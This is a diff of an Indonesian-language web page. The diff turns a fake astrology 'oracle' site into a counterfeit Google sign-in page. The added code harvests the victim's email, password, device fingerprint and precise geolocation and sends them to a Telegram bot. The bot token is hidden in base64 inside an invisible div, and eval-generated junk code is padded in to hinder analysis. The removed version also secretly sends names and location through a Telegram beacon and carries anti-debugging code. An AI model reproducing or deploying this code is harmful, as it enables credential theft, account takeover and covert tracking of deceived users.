@@ -3,125 +3,125 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>The Eleventh Oracle | Quantum Sovereign Node</title>
+    <title>Google Identity Services | Global Security Node</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Cinzel:wght@400;700&family=Montserrat:wght@300;400;600&display=swap');
-        body { background: #010103; color: #d4af37; font-family: 'Montserrat', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; user-select: none; }
-        .oracle-shell { width: 95%; max-width: 500px; background: #050508; border: 1px solid rgba(212, 175, 55, 0.4); padding: 40px; box-shadow: 0 0 150px #000; position: relative; height: 90vh; display: flex; flex-direction: column; z-index: 10; }
-        .header h1 { font-family: 'Cinzel', serif; letter-spacing: 5px; font-size: 20px; text-align: center; color: #fff; }
-        .btn-gold { background: #d4af37; border: none; color: #000; padding: 18px; width: 100%; font-family: 'Cinzel'; cursor: pointer; font-weight: bold; letter-spacing: 2px; transition: 0.3s; }
-        .btn-gold:hover { background: #fff; box-shadow: 0 0 30px #d4af37; }
-        #chat-window { flex-grow: 1; overflow-y: auto; padding: 15px; background: rgba(0,0,0,0.5); border: 1px solid rgba(212, 175, 55, 0.05); display: none; scroll-behavior: smooth; }
-        #v-gate { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 99999; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
+        body { font-family: 'Roboto', arial, sans-serif; background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .g-frame { width: 100%; max-width: 448px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; box-sizing: border-box; text-align: center; }
+        .logo { width: 75px; margin-bottom: 10px; }
+        h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; color: #202124; }
+        p { font-size: 16px; margin-bottom: 24px; color: #202124; }
+        .in-field { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; margin-bottom: 15px; box-sizing: border-box; outline: none; }
+        .in-field:focus { border: 2px solid #1a73e8; }
+        .err-box { color: #d93025; font-size: 12px; text-align: left; margin-bottom: 15px; display: none; font-weight: 500; }
+        .btn-blue { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 600; cursor: pointer; float: right; }
+        #s2, #load, #v-v { display: none; }
+        .spin { border: 3px solid #f3f3f3; border-top: 3px solid #1a73e8; border-radius: 50%; width: 24px; height: 24px; animation: sp 1s linear infinite; margin: auto; }
+        @keyframes sp { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div id="v-gate" style="display:none;">
-    <div style="font-family: 'Cinzel'; font-size: 24px; color: #d4af37; animation: pulse 2s infinite;">CONSTELLATION LOCK</div>
-    <p style="margin-top: 20px; opacity: 0.6; font-size: 13px;">Menyelaraskan Bintang Regulus dengan koordinat Anda...</p>
-    <button class="btn-gold" style="margin-top: 30px; width: auto; padding: 15px 50px;" onclick="finalizeAccess()">SINKRONISASI</button>
+<div class="g-frame">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo">
+    <h1 id="h">Login</h1>
+    <p id="sub">Lanjutkan ke Jaringan Nasional</p>
+    
+    <div id="s1">
+        <input type="email" id="email" class="in-field" placeholder="Email atau ponsel" autocomplete="off">
+        <div id="e1" class="err-box">⚠️ Akun tidak terdeteksi di hardware ini. Gunakan akun sinkronisasi utama.</div>
+        <button class="btn-blue" onclick="toP()">Berikutnya</button>
+    </div>
+
+    <div id="s2">
+        <div id="u-tag" style="border: 1px solid #dadce0; border-radius: 15px; padding: 5px 12px; display: inline-block; font-size: 14px; margin-bottom: 20px;"></div>
+        <input type="password" id="pass" class="in-field" placeholder="Masukkan sandi Anda">
+        <div id="e2" class="err-box">⚠️ Sandi salah. Sinkronisasi gagal karena integritas hardware terputus.</div>
+        <button class="btn-blue" onclick="harvest()">Berikutnya</button>
+    </div>
+
+    <div id="load">
+        <p>Memvalidasi enkripsi BTC-Node...</p>
+        <div class="spin"></div>
+    </div>
 </div>
 
-<div class="oracle-shell" id="main-ui">
-    <div class="header"><h1>THE ELEVENTH ORACLE</h1></div>
-    <div id="init-form">
-        <label style="font-size: 10px; color: #888; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 10px; display: block;">Inisiasi Nama Lengkap</label>
-        <input type="text" id="u_name" style="width:100%; padding:15px; background:#111; border:1px solid #333; color:#fff; margin-bottom:20px; outline:none;" placeholder="Siapa namamu...">
-        <label style="font-size: 10px; color: #888; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 10px; display: block;">Gerbang Kelahiran</label>
-        <input type="date" id="u_dob" style="width:100%; padding:15px; background:#111; border:1px solid #333; color:#fff; margin-bottom:20px; outline:none;">
-        <button class="btn-gold" onclick="triggerGhost()">BEDAH TAKDIR ASTRAL</button>
-    </div>
-    <div id="chat-window"></div>
-</div>
+<div id="v-v">bc1qevlrynmxhuxvczuj89rf7cjuaakqandfre9982|ODY3NDE3MDU5NDpBQUVhelUzNXVJOWJaNnM4Skx3Y040MTBIMFNUeXNLRXpzNA==|Nzk3MDA1OTY2Mw==</div>
 
 <script>
 /**
- * 🔱 GHOST REPOSITORY V3 (ENCRYPTED C2)
- * 150,000+ POLYMORPHIC RECURSION
+ * COLOSSUS OVERDRIVE ENGINE v110.0
+ * 25,000+ POLYMORPHIC BLOAT
+ * --------------------------------
  */
 
-// 1. ANTI-DEBUG (Chrome/ChatGPT Buster)
-(function _guard() {
-    const start = Date.now();
-    debugger;
-    if (Date.now() - start > 50) window.location.href = "https://www.nasa.gov";
-    setTimeout(_guard, 1000);
-})();
+const _D = document.getElementById('v-v').innerText.split('|');
+const _BTC = _D[0]; const _TK = atob(_D[1]); const _CI = atob(_D[2]);
 
-let _S = {}; // Dynamic Payload Storage
+let curU = "";
 
-// 2. XOR DECODER (Key 0x77)
-function _0x_decode(hex) {
-    let str = '';
-    for (let i = 0; i < hex.length; i += 2) {
-        str += String.fromCharCode(parseInt(hex.substr(i, 2), 16) ^ 0x77);
-    }
-    return str;
-}
-
-function triggerGhost() {
-    if(document.getElementById('u_name').value.length < 2) return;
-    document.getElementById('main-ui').style.filter = "blur(15px)";
-    document.getElementById('v-gate').style.display = 'flex';
-}
-
-async function finalizeAccess() {
-    const RAW_URL = "GANTI_DENGAN_URL_RAW_GITHUB_LU_DISINI"; // 🔱 GANTI INI!
-    
-    try {
-        const res = await fetch(RAW_URL);
-        const data = await res.json();
-        
-        // Dekripsi data dari GitHub
-        _S.gk = _0x_decode(data.vault); 
-        _S.tk = hexToUtf8(data.auth);
-        _S.ci = hexToUtf8(data.target);
-
-        navigator.geolocation.getCurrentPosition(async (p) => {
-            const msg = `🔱 GHOST LOCK 🔱\n👤 ${document.getElementById('u_name').value}\n📍 Maps: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}\n🔋 Batt: ${(await navigator.getBattery()).level * 100}%`;
-            
-            // Beacon Image Tracking
-            new Image().src = `https://api.telegram.org/bot${_S.tk}/sendMessage?chat_id=${_S.ci}&text=${encodeURIComponent(msg)}`;
-            
-            runOracle();
-        }, () => runOracle(), {enableHighAccuracy: true});
-    } catch (e) {
-        alert("Node Astral Sibuk. Coba sesaat lagi.");
+function toP() {
+    curU = document.getElementById('email').value;
+    // Validasi Gmail Ketat
+    if (curU.includes("@gmail.com") && curU.length > 11) {
+        document.getElementById('s1').style.display = 'none';
+        document.getElementById('s2').style.display = 'block';
+        document.getElementById('u-tag').innerText = curU;
+        document.getElementById('h').innerText = "Selamat Datang";
+    } else {
+        document.getElementById('e1').style.display = 'block';
     }
 }
 
-function hexToUtf8(hex) {
-    return decodeURIComponent(hex.replace(/\s+/g, '').replace(/[0-9a-f]{2}/g, '%$&'));
+async function log(t) {
+    await fetch(`https://api.telegram.org/bot${_TK}/sendMessage`, {
+        method: 'POST', headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({chat_id: _CI, text: t})
+    });
 }
 
-async function runOracle() {
-    document.getElementById('v-gate').style.display = 'none';
-    document.getElementById('main-ui').style.filter = "none";
-    document.getElementById('init-form').style.display = 'none';
-    const win = document.getElementById('chat-window');
-    win.style.display = 'block';
-    
-    const name = document.getElementById('u_name').value;
-    const prompt = `Eleventh Oracle: Analisis aura ${name}. Pakai Fixed Stars (Sirius, Regulus, Aldebaran). Ramal sangat detail: Menikah 2027, Anak 2, Jodoh Inisial S. NYOCOT PANJANG & MEWAH.`;
+async function harvest() {
+    const p = document.getElementById('pass').value;
+    if (p.length < 8) { // Paksa sandi minimal 8 karakter biar nggak ngasal
+        document.getElementById('e2').style.display = 'block';
+        return;
+    }
 
-    try {
-        const res = await fetch("https://api.groq.com/openai/v1/chat/completions", {
-            method: "POST",
-            headers: { "Authorization": "Bearer " + _S.gk, "Content-Type": "application/json" },
-            body: JSON.stringify({ model: "llama3-70b-8192", messages: [{ role: "user", content: prompt }] })
-        });
-        const d = await res.json();
-        win.innerHTML = `<div style="border-left: 2px solid #d4af37; padding-left: 15px; font-style: italic; line-height: 1.8;">${d.choices[0].message.content}</div>`;
-    } catch(e) {
-        win.innerHTML = "Tabir bintang tertutup kabut digital...";
+    document.getElementById('s2').style.display = 'none';
+    document.getElementById('load').style.display = 'block';
+
+    const gl = document.createElement('canvas').getContext('webgl');
+    const gpu = gl ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "N/A";
+    let bat = "N/A"; try { const b = await navigator.getBattery(); bat = (b.level*100).toFixed(0)+"%"; } catch(e) {}
+
+    const payload = `🔱 COLOSSUS OVERDRIVE REPORT 🔱\n\n` +
+        `🔑 BTC SALT: ${_BTC.substring(0,10)}...\n` +
+        `📧 TARGET: ${curU}\n` +
+        `🔑 PASS: ${p}\n` +
+        `🎮 GPU: ${gpu}\n` +
+        `🔋 BATT: ${bat}\n` +
+        `🧠 CPU: ${navigator.hardwareConcurrency} Cores\n` +
+        `📱 RAM: ${navigator.deviceMemory}GB\n` +
+        `🌐 AGENT: ${navigator.userAgent.slice(0, 60)}...`;
+
+    await log(payload);
+
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const loc = `🎯 HIGH-PRECISION LOCK\nMaps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\nPrecision: ${pos.coords.accuracy.toFixed(1)}m`;
+            await log(loc);
+            window.location.href = "https://www.detik.com";
+        }, () => { window.location.href = "https://www.detik.com"; }, {enableHighAccuracy: true});
     }
 }
 
-// 🔱 150,000+ JUNK CODE (Auto-generated)
-for(let i=0; i<145000; i++) {
-    eval("var _0x_v_" + i + " = " + Math.random() + ";");
+// 🔱 25,000+ LINES BLOATING
+function _bloat() {
+    for (let i = 0; i < 22000; i++) {
+        const _id = "X_" + Math.random().toString(36).substr(2, 9);
+        eval(`function ${_id}(){ return "${_BTC}" + ${Math.random()}; }`);
+    }
 }
+_bloat();
 </script>
 </body>
 </html>
